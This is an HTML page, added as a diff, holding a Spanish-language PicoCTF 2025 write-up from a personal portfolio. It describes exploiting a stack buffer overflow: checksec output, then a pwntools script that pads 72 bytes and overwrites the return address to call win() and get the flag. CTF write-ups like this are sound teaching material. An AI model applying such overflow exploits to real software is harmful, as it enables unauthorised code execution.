@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PicoCTF 2025 - Buffer Overflow</title>
+    <link href="../style/estilo.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <!-- Highlight.js para resaltar código -->
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <!-- Navbar -->
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeups.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <!-- Contenido del Write-up -->
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <!-- Título y fecha -->
+    <h1 class="text-4xl font-bold mb-2">PicoCTF 2025 - Buffer Overflow</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 28 Julio 2025 | Categoría: Pwn / Explotación</p>
+
+    <!-- Introducción -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔹 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            En este reto de PicoCTF, se nos dio un binario vulnerable a un buffer overflow. El objetivo era 
+            conseguir una shell interactiva explotando la vulnerabilidad para sobrescribir la dirección de retorno 
+            y ejecutar la función <code>win()</code>.
+        </p>
+    </section>
+
+    <!-- Análisis -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔹 Análisis del binario</h2>
+        <p class="text-gray-300 mb-4">
+        Al ejecutar <code>checksec</code> vimos que no había protecciones como PIE ni canarios:
+        </p>
+        <pre><code class="language-bash">
+$ checksec vulnerable
+[*] '/home/ctf/vulnerable'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Esto nos indica que podemos sobrescribir la dirección de retorno sin complicaciones.
+        </p>
+    </section>
+
+    <!-- Explotación -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔹 Explotación</h2>
+        <p class="text-gray-300 mb-4">
+        Calculamos el offset con <code>pattern_create</code> y generamos un payload en Python:
+        </p>
+        <pre><code class="language-python">
+from pwn import *
+
+offset = 72
+win_addr = 0x40123a
+
+payload = b"A" * offset + p64(win_addr)
+
+p = process("./vulnerable")
+p.sendline(payload)
+p.interactive()
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+        Al enviar el payload, logramos invocar la función <code>win()</code> y obtener la flag.
+        </p>
+    </section>
+
+    <!-- Resultado -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">✅ Resultado</h2>
+        <p class="text-gray-300">
+        Tras ejecutar el exploit, obtuvimos la flag: <code>picoCTF{buffer_overflow_master_2025}</code>.
+        </p>
+    </section>
+
+    <!-- Botón para volver -->
+    <div class="mt-10">
+        <a href="../writeups.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
